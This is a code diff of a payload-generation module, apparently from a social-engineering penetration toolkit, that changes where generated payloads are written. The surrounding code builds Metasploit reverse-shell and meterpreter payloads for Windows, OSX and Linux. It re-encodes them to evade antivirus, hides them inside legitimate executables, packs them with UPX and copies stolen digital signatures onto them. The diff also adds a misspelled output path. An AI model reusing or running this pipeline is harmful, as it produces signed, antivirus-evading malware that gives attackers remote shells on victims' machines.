@@ -294,7 +294,7 @@ try:
         check_write.write("VALID")
         check_write.close()
         shutil.copyfile("%s" % (choice1), "msf.exe") #subprocess.Popen("cp %s msf.exe;cp msf.exe %s/src/html/msf.exe" % (choice1,definepath), shell=True).wait()
-        shutil.copyfile("msf.exe", "%s/src/html/msf.exe" % (definepath))
+        shutil.copyfile("msf.exe", "%s/src/program_junk/msf.exe" % (definepath))
 
     # Specify Encoding Option
     encoder="false"
@@ -400,7 +400,7 @@ try:
                 if choice1 != "shellcode/alphanum":
 		    if choice1 != "shellcode/pyinject":
 			    if choice1 != "shellcode/multipyinject":
-		                    generatepayload=subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s %s %s %s > %s/src/html/%s" % (path,choice1,choice2,portnum,courtesyshell,choice4,definepath,msf_filename), shell=True).wait()    
+		                    generatepayload=subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s %s %s %s > %s/src/program_junk/%s" % (path,choice1,choice2,portnum,courtesyshell,choice4,definepath,msf_filename), shell=True).wait()    
                 # if we are using shellcodeexec
                 if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
 		    if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject":
@@ -557,7 +557,7 @@ try:
                     data = fileopen.read()
                     filewrite.write(data.replace("UPX", random_string, 4))
                     filewrite.close()
-                    subprocess.Popen("cp %s/src/program_junk/shellcodeexec.custom %s/src/html/msf.exe 1> /dev/null 2> /dev/null" % (definepath,definepath), shell=True).wait()
+                    subprocess.Popen("cp %s/src/program_junk/shellcodeexec.custom %s/src/program_junk/msf.exe 1> /dev/null 2> /dev/null" % (definepath,definepath), shell=True).wait()
                     # we need to read in the old index.html file because its already generated, need to present the alphanum to it
                     if os.path.isfile("%s/src/program_junk/web_clone/index.html" % (definepath)):
                         fileopen = file("%s/src/program_junk/web_clone/index.html" % (definepath), "r")
@@ -630,14 +630,14 @@ try:
             if encode != "MULTIENCODE":
                 if encode != "BACKDOOR":
                     print_info("Encoding the payload %s times to get around pesky Anti-Virus. [-]\n" % (str(encount)))
-                    encodepayload=subprocess.Popen(r"ruby %s/msfencode < %s/src/html/1msf.exe -e %s -o %s/src/html/msf.exe -t exe -c %s" % (path,definepath,encode,definepath,encount), shell=True).wait()
-                    subprocess.Popen("cp src/html/msf.exe src/program_junk/ 1> /dev/null 2> /dev/null", shell=True).wait()
+                    encodepayload=subprocess.Popen(r"ruby %s/msfencode < %s/src/program_junk/1msf.exe -e %s -o %s/src/program_junk/msf.exe -t exe -c %s" % (path,definepath,encode,definepath,encount), shell=True).wait()
+                    # subprocess.Popen("cp src/program_junk/msf.exe src/program_junk/ 1> /dev/null 2> /dev/null", shell=True).wait()
  
             # If option 16 or default then go here
             if encode == "MULTIENCODE":
                 print_info("Encoding the payload multiple times to get around pesky Anti-Virus.")
-                encodepayload=subprocess.Popen(r"ruby %s/msfencode -e x86/shikata_ga_nai -i %s/src/html/1msf.exe -t raw -c 5 | ruby %s/msfencode -t raw -e x86/alpha_upper -c 2 | ruby %s/msfencode -t raw -e x86/shikata_ga_nai -c 5 | ruby %s/msfencode -t exe -c 5 -e x86/countdown -o %s/src/html/msf.exe" % (path,definepath,path,path,path,definepath), shell=True).wait()
-                subprocess.Popen("cp src/html/msf.exe src/program_junk/ 1> /dev/null 2> /dev/null", shell=True).wait()
+                encodepayload=subprocess.Popen(r"ruby %s/msfencode -e x86/shikata_ga_nai -i %s/src/program_junk/1msf.exe -t raw -c 5 | ruby %s/msfencode -t raw -e x86/alpha_upper -c 2 | ruby %s/msfencode -t raw -e x86/shikata_ga_nai -c 5 | ruby %s/msfencode -t exe -c 5 -e x86/countdown -o %s/src/program_junk/msf.exe" % (path,definepath,path,path,path,definepath), shell=True).wait()
+                #subprocess.Popen("cp src/html/msf.exe src/program_junk/ 1> /dev/null 2> /dev/null", shell=True).wait()
                 encode1=("x86/countdown")
 
             # If option 16, backdoor executable better AV avoidance
@@ -647,7 +647,7 @@ try:
                 if backdoor_execution == "on": backdoor_execution = "-k"
                 if backdoor_execution != "on": backdoor_execution = ""
                 subprocess.Popen("cp %s src/program_junk/legit.exe 1> /dev/null 2> /dev/null" % (custom_exe), shell=True).wait()
-                encodepayload=subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s %s %s %s | ruby %s/msfencode  -c 10 -e x86/shikata_ga_nai -x src/program_junk/legit.exe -o %s/src/html/msf.exe -t exe %s 1> /dev/null 2>/dev/null" % (path,choice1,choice2,portnum,courtesyshell,choice4,path,definepath,backdoor_execution), shell=True).wait()
+                encodepayload=subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s %s %s %s | ruby %s/msfencode  -c 10 -e x86/shikata_ga_nai -x src/program_junk/legit.exe -o %s/src/program_junk/msf.exe -t exe %s 1> /dev/null 2>/dev/null" % (path,choice1,choice2,portnum,courtesyshell,choice4,path,definepath,backdoor_execution), shell=True).wait()
                 print_status("Backdoor completed successfully. Payload is now hidden within a legit executable.")
 
 
@@ -655,13 +655,13 @@ try:
                 if upx_encode == "ON":
                     if choice1 != "set/reverse_shell":
                         print_status("UPX Encoding is set to ON, attempting to pack the executable with UPX encoding.")
-                        upx("src/html/msf.exe")
+                        upx("%s/src/program_junk/msf.exe" % (definepath))
 
                 # define to use digital signature stealing or not
                 if digital_steal == "ON":
                     print_status("Digital Signature Stealing is ON, hijacking a legit digital certificate") 
-                    disitool.CopyDigitalSignature("src/core/digitalsig/digital.signature", "src/html/msf.exe", "src/program_junk/msf2.exe")
-                    subprocess.Popen("cp src/program_junk/msf2.exe src/html/msf.exe 1> /dev/null 2> /dev/null", shell=True).wait()
+                    disitool.CopyDigitalSignature("src/core/digitalsig/digital.signature", "src/program_junk/msf.exe", "src/program_junk/msf2.exe")
+                    subprocess.Popen("cp src/program_junk/msf2.exe src/program_junk/msf.exe 1> /dev/null 2> /dev/null", shell=True).wait()
                     subprocess.Popen("cp src/program_junk/msf2.exe src/program_junk/msf.exe", shell=True).wait()
                 encode1=("x86/shikata_ga_nai")
 
@@ -682,9 +682,9 @@ try:
 		if check_config("DEPLOY_OSX_LINUX_PAYLOADS=").lower() == "on":
 	                port2=check_config("LINUX_REVERSE_PORT=")
         	        print_status("Generating OSX payloads through Metasploit...")
-                	subprocess.Popen(r"ruby %s/msfpayload osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s X > %s/src/html/mac.bin;chmod 755 %s/src/html/mac.bin" % (path,choice2,port1,definepath,definepath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                	subprocess.Popen(r"ruby %s/msfpayload osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s X > %s/src/porgram_junk/mac.bin;chmod 755 %s/src/program_junk/mac.bin" % (path,choice2,port1,definepath,definepath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                 	print_status("Generating Linux payloads through Metasploit...")
-                	subprocess.Popen(r"ruby %s/msfpayload linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s X > %s/src/html/nix.bin" % (path,choice2,port2,definepath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                	subprocess.Popen(r"ruby %s/msfpayload linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s X > %s/src/program_junk/nix.bin" % (path,choice2,port2,definepath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                 	if multiattack_java == "on":
                     		multiattack.write("OSX="+str(port1)+"\n")
                     		multiattack.write("OSXPAYLOAD=osx/x86/shell_reverse_tcp\n")
